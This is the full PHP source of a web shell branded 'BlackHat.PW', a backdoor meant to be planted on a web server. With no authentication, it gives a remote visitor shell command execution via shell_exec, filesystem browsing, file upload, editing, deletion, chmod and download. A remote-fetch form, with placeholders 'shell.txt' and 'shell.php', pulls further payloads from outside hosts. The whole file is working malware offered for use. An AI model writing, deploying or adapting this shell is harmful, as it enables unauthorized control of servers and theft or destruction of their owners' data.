<?php

// -shell | minimal functional shell
error_reporting(0);
set_time_limit(0);

function hex_encode($v){ return bin2hex($v); }
function hex_decode($v){
    if (!is_string($v) || $v === '' || (strlen($v) % 2) !== 0 || !ctype_xdigit($v)) return false;
    return hex2bin($v);
}
function url_path($path){ return urlencode(hex_encode($path)); }

$rawPath = isset($_GET['p']) ? hex_decode($_GET['p']) : __DIR__;
$p = $rawPath ? realpath($rawPath) : __DIR__;
if (!$p || !is_dir($p)) $p = __DIR__;

function perms($f){ return substr(sprintf('%o', @fileperms($f)), -4); }

// ===== ACTIONS =====
if (!empty($_FILES['f']['name']) && (isset($_POST['up']) || isset($_POST['up_stream']))) {
    $target = $p.'/'.basename($_FILES['f']['name']);
    if (isset($_POST['up_stream'])) {
        $in = @fopen($_FILES['f']['tmp_name'], 'rb');
        $out = @fopen($target, 'wb');
        if ($in && $out) stream_copy_to_stream($in, $out);
        if ($in) fclose($in);
        if ($out) fclose($out);
    } else {
        move_uploaded_file($_FILES['f']['tmp_name'], $target);
    }
    header('Location: ?p='.url_path($p)); exit;
}
if (isset($_POST['new']) && trim($_POST['n'])) {
    file_put_contents($p.'/'.trim($_POST['n']), '');
    header('Location: ?p='.url_path($p)); exit;
}
if (isset($_POST['mkdir']) && trim($_POST['d'])) {
    @mkdir($p.'/'.trim($_POST['d']));
    header('Location: ?p='.url_path($p)); exit;
}
if (isset($_POST['fetch']) && trim($_POST['fetch_url']) && trim($_POST['fetch_name'])) {
    $url = trim($_POST['fetch_url']);
    $name = basename(trim($_POST['fetch_name']));
    if ($name !== '') {
        $ctx = stream_context_create([
            'http' => ['follow_location' => 1, 'timeout' => 30],
            'https' => ['follow_location' => 1, 'timeout' => 30],
        ]);
        $data = @file_get_contents($url, false, $ctx);
        if ($data !== false) file_put_contents($p.'/'.$name, $data);
    }
    header('Location: ?p='.url_path($p)); exit;
}
if (isset($_GET['del'])) {
    $t = $p.'/'.$_GET['del'];
    is_file($t) ? @unlink($t) : @rmdir($t);
    header('Location: ?p='.url_path($p)); exit;
}
if (isset($_POST['ren']) && isset($_POST['old'], $_POST['new'])) {
    @rename($p.'/'.$_POST['old'], $p.'/'.$_POST['new']);
    header('Location: ?p='.url_path($p)); exit;
}
if (isset($_POST['chmod']) && isset($_POST['t'], $_POST['m'])) {
    @chmod($p.'/'.$_POST['t'], octdec($_POST['m']));
    header('Location: ?p='.url_path($p)); exit;
}
if (isset($_GET['dl'])) {
    $f = $p.'/'.basename($_GET['dl']);
    if (is_file($f)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($f).'"');
        header('Content-Length: '.filesize($f));
        readfile($f); exit;
    }
}
if (isset($_POST['save']) && isset($_POST['file'])) {
    $content = $_POST['content'];
    if (isset($_POST['content_b64'])) {
        $decoded = base64_decode($content, true);
        if ($decoded !== false) $content = $decoded;
    }
    file_put_contents($p.'/'.$_POST['file'], $content);
    header('Location: ?p='.url_path($p)); exit;
}

// ===== TERMINAL PAGE =====
if (isset($_GET['term'])) {
    $out = '';
    if (isset($_POST['cmd']) && trim($_POST['c'])) {
        $out = shell_exec('cd '.escapeshellarg($p).' && '.trim($_POST['c']).' 2>&1');
    }
    ?>
    <!DOCTYPE html>
    <html>
    <head>
    <meta charset="utf-8">
    <title>BlackHat.PW -  terminal</title>
    <style>
    body{background:#000;color:#fff;font-family:monospace;font-size:13px;margin:0;padding:10px}
    a{color:#0f0} input,button{background:#111;color:#0f0;border:1px solid #0f0;padding:4px 8px;font-family:monospace}
    button:hover{background:#0f0;color:#000}
    pre{background:#0a0a0a;color:#0f0;padding:8px;height:70vh;overflow:auto;border:1px solid #1a1a1a;white-space:pre-wrap}
    .title{color:#f00;font-size:18px;margin-bottom:8px}
    </style>
    </head>
    <body>
    <div class="title"></div>
    <div>
        <a href="?p=<?=url_path($p)?>">[back]</a> |
        PATH: <?=htmlspecialchars($p)?>
    </div>
    <form method="post" style="margin:10px 0">
        CMD: <input type="text" name="c" style="width:70%" value="<?=isset($_POST['c'])?htmlspecialchars($_POST['c']):''?>" autofocus>
        <button name="cmd">EXEC</button>
    </form>
    <pre><?=htmlspecialchars($out)?></pre>
    </body>
    </html>
    <?php
    exit;
}

// ===== EDIT MODE =====
if (isset($_GET['edit'])) {
    $editParam = hex_decode($_GET['edit']);
    $editfile = $editParam !== false ? basename($editParam) : '';
    $full = $p.'/'.$editfile;
    if (!is_file($full)) { header('Location: ?p='.url_path($p)); exit; }
    $content = file_get_contents($full);
    ?>
    <!DOCTYPE html>
    <html>
    <head>
    <meta charset="utf-8">
    <title>BlackHat.PW - </title>
    <style>
    body{background:#000;color:#fff;font-family:monospace;font-size:13px;margin:0;padding:10px}
    a{color:#0f0} input,button,textarea{background:#111;color:#0f0;border:1px solid #0f0;padding:4px;font-family:monospace;font-size:13px}
    button:hover{background:#0f0;color:#000}
    textarea{width:100%;height:70vh;margin:8px 0}
    label{display:inline-flex;align-items:center;gap:6px;margin-right:10px}
    .title{color:#f00;font-size:18px;margin-bottom:8px}
    </style>
    </head>
    <body>
    <div class="title">BlackHat.PW - </div>
    <div>Editing: <b><?=htmlspecialchars($editfile)?></b> | <a href="?p=<?=url_path($p)?>">[back]</a></div>
    <form method="post" id="edit-form">
        <input type="hidden" name="file" value="<?=htmlspecialchars($editfile)?>">
        <input type="hidden" name="content_b64" id="content_b64" value="">
        <textarea name="content"><?=htmlspecialchars($content)?></textarea>
        <label><input type="checkbox" id="use_b64"> Send as base64</label>
        <button name="save">SAVE</button>
        <a href="?p=<?=url_path($p)?>" style="margin-left:10px">Cancel</a>
    </form>
    <script>
    document.getElementById('edit-form').addEventListener('submit', function () {
        var useB64 = document.getElementById('use_b64');
        var flag = document.getElementById('content_b64');
        var content = this.elements.content;
        if (!useB64.checked) {
            flag.value = '';
            return;
        }
        var bytes = new TextEncoder().encode(content.value);
        var binary = '';
        for (var i = 0; i < bytes.length; i++) binary += String.fromCharCode(bytes[i]);
        content.value = btoa(binary);
        flag.value = '1';
    });
    </script>
    </body>
    </html>
    <?php
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>BlackHat.PW - </title>
<style>
body{background:#000;color:#fff;font-family:monospace;font-size:13px;margin:0;padding:10px}
a{color:#0f0;text-decoration:none}
a:hover{text-decoration:underline}
input,button{background:#111;color:#0f0;border:1px solid #0f0;padding:3px 6px;font-family:monospace;font-size:13px}
button:hover{background:#0f0;color:#000}
select{background:#111;color:#0f0;border:1px solid #0f0;padding:3px 6px;font-family:monospace;font-size:13px}
table{width:100%;border-collapse:collapse;margin:8px 0}
td,th{padding:3px 6px;border-bottom:1px solid #222;text-align:left}
th{color:#0f0}
.btn{border:1px solid #0f0;padding:2px 7px;text-decoration:none;display:inline-block;color:#0f0}
.btn:hover{background:#0f0;color:#000}
.delbtn{color:#f00;border:1px solid #f00;padding:2px 7px;text-decoration:none;display:inline-block}
.delbtn:hover{background:#f00;color:#000}
.w{color:#0f0}
.nw{color:#f00}
.title{color:#f00;font-size:20px;letter-spacing:2px;margin-bottom:6px}
form.inline{display:inline}
</style>
</head>
<body>

<div class="title">BlackHat.PW - </div>

<div>
<a href="?p=<?=url_path(__DIR__)?>">[HOME]</a> |
<a href="?p=<?=url_path($p)?>&term=1">[TERMINAL]</a> |
PATH: 
<?php
$parts = explode('/', trim($p,'/'));
$build = '';
echo '<a href="?p='.url_path('/').'">/</a>';
foreach($parts as $part){
    if($part==='') continue;
    $build .= '/'.$part;
    echo '<a href="?p='.url_path($build).'">'.htmlspecialchars($part).'</a>/';
}
?>
</div>

<form method="post" enctype="multipart/form-data" style="margin:8px 0" id="upload-form">
Upload: <input type="file" name="f" id="upload-file">
<select id="upload-mode" name="upload_mode">
<option value="normal">Mode 1 - multipart</option>
<option value="stream">Mode 2 - stream copy</option>
</select>
<button name="up" id="upload-btn">UP</button>
&nbsp;|&nbsp;
New file: <input type="text" name="n" size="12"> <button name="new">CREATE</button>
&nbsp;|&nbsp;
New folder: <input type="text" name="d" size="12"> <button name="mkdir">MKDIR</button>
</form>

<form method="post" style="margin:8px 0">
Remote: <input type="text" name="fetch_url" size="42" placeholder="https://example.com/shell.txt">
Save as: <input type="text" name="fetch_name" size="18" placeholder="shell.php">
<button name="fetch">Download</button>
</form>

<table>
<tr><th>name</th><th>size</th><th>perms</th><th>actions</th></tr>
<?php if($p !== '/'): ?>
<tr><td colspan="4"><a href="?p=<?=url_path(dirname($p))?>">.. (up)</a></td></tr>
<?php endif; ?>

<?php
$items = @scandir($p) ?: [];
$dirs = $files = [];
foreach($items as $i){
    if($i==='.'||$i==='..') continue;
    is_dir($p.'/'.$i) ? $dirs[]=$i : $files[]=$i;
}
sort($dirs); sort($files);

foreach($dirs as $d):
    $f = $p.'/'.$d;
    $wc = is_writable($f) ? 'w' : 'nw';
?>
<tr>
<td><a href="?p=<?=url_path($f)?>"><?=htmlspecialchars($d)?>/</a></td>
<td>-</td>
<td class="<?=$wc?>"><?=perms($f)?></td>
<td>
<form class="inline" method="post">
<input type="hidden" name="old" value="<?=htmlspecialchars($d)?>">
<input type="text" name="new" size="12" value="<?=htmlspecialchars($d)?>">
<button name="ren">REN</button>
</form>
<form class="inline" method="post">
<input type="hidden" name="t" value="<?=htmlspecialchars($d)?>">
<input type="text" name="m" size="4" value="<?=perms($f)?>">
<button name="chmod">CHMOD</button>
</form>
<a class="delbtn" href="?p=<?=url_path($p)?>&del=<?=urlencode($d)?>" onclick="return confirm('DEL?')">DEL</a>
</td>
</tr>
<?php endforeach; ?>

<?php foreach($files as $file):
    $f = $p.'/'.$file;
    $wc = is_writable($f) ? 'w' : 'nw';
?>
<tr>
<td><?=htmlspecialchars($file)?></td>
<td><?=filesize($f)?></td>
<td class="<?=$wc?>"><?=perms($f)?></td>
<td>
<form class="inline" method="post">
<input type="hidden" name="old" value="<?=htmlspecialchars($file)?>">
<input type="text" name="new" size="12" value="<?=htmlspecialchars($file)?>">
<button name="ren">REN</button>
</form>
<form class="inline" method="post">
<input type="hidden" name="t" value="<?=htmlspecialchars($file)?>">
<input type="text" name="m" size="4" value="<?=perms($f)?>">
<button name="chmod">CHMOD</button>
</form>
<a class="btn" href="?p=<?=url_path($p)?>&dl=<?=urlencode($file)?>">DL</a>
<a class="btn" href="?p=<?=url_path($p)?>&edit=<?=urlencode(hex_encode($file))?>">EDIT</a>
<a class="delbtn" href="?p=<?=url_path($p)?>&del=<?=urlencode($file)?>" onclick="return confirm('DEL?')">DEL</a>
</td>
</tr>
<?php endforeach; ?>
</table>

<script>
document.getElementById('upload-form').addEventListener('submit', function () {
    document.getElementById('upload-btn').name =
        document.getElementById('upload-mode').value === 'stream' ? 'up_stream' : 'up';
});
</script>

</body>
</html>
